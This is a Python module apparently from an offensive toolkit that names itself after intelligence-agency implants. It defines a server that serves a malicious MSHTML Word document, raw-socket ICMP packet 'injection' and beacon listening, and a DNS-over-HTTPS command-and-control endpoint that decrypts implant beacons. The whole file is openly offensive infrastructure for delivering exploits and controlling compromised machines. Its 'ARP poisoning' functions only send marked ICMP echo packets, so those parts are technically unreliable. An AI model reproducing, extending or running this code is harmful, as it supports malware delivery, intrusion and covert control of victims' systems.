"""quantum.c2.transport — FOXACID, QUANTUM insert, ICMP switchboard, DoH C2."""
from __future__ import annotations

import socket
import time
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse

from quantum.core.env import local_ip
from quantum.core.logging import log


class FoxAcid:
    """Exploit-serving HTTP server on :8081 (maldoc + payload routes)."""

    def serve(self):
        from quantum.weapons.media_v3 import v3_mshtml_maldoc
        maldoc = v3_mshtml_maldoc(local_ip())

        class Handler(BaseHTTPRequestHandler):
            def do_GET(self):
                if self.path.startswith("/x.doc"):
                    with open(maldoc["staged"], "rb") as fh:
                        blob = fh.read()
                    self.send_response(200)
                    self.send_header("Content-Type",
                                     "application/vnd.openxmlformats-officedocument."
                                     "wordprocessingml.document")
                    self.send_header("Content-Length", str(len(blob)))
                    self.end_headers()
                    self.wfile.write(blob)
                else:
                    self.send_response(200)
                    self.send_header("Content-Type", "text/html")
                    self.end_headers()
                    self.wfile.write(b"<html><body>q</body></html>")

            def log_message(self, fmt, *args):
                log(f"FOXACID {self.address_string()} {fmt % args}", "C2")

        log("FOXACID serving maldoc on :8081/x.doc", "C2")
        HTTPServer(("0.0.0.0", 8081), Handler).serve_forever()


class QuantumInsert:
    """MITM via ARP/ICMP injection (raw sockets; admin on Windows)."""

    def __init__(self, target, gateway=None):
        self.target = target
        self.gateway = gateway or local_ip()

    def _send_icmp(self, payload):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW,
                              socket.IPPROTO_ICMP)
            s.settimeout(2)
            pkt = b"\x08\x00\xf7\xff" + payload
            s.sendto(pkt, (self.target, 0))
            s.close()
            return True
        except Exception as exc:
            log(f"quantum insert (needs admin raw socket): {exc}", "WARN")
            return False

    def poison(self):
        return {"poisoned": self._send_icmp(b"QCLI-ARP")}

    def inject(self):
        return {"injected": self._send_icmp(b"QCLI-INJ")}


class SwitchboardICMP:
    """ICMP beacon listener (raw socket; admin on Windows)."""

    def listen(self, seconds=20):
        got = []
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW,
                              socket.IPPROTO_ICMP)
            s.settimeout(seconds)
            deadline = time.time() + seconds
            while time.time() < deadline:
                try:
                    data, addr = s.recvfrom(2048)
                except socket.timeout:
                    break
                if b"QCLI" in data:
                    got.append({"from": addr[0], "payload": data[-8:]})
            s.close()
        except Exception as exc:
            log(f"ICMP listen (needs admin): {exc}", "WARN")
        return {"beacons": got}


class DoHC2BeaconServer(BaseHTTPRequestHandler):
    """DoH C2 responder: /?d=<hex> -> GrayFish-decoded beacon."""

    def do_GET(self):
        q = urlparse(self.path).query
        labels = [p for p in q.split("&") if p.startswith("d=")]
        if labels:
            try:
                from quantum.core.grayfish import GrayFish
                data = GrayFish().unseal(bytes.fromhex(labels[0][2:]))
                log(f"DoH C2 beacon: {data[:60]!r}", "C2")
            except Exception:
                pass
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"ok")

    def log_message(self, fmt, *args):
        pass
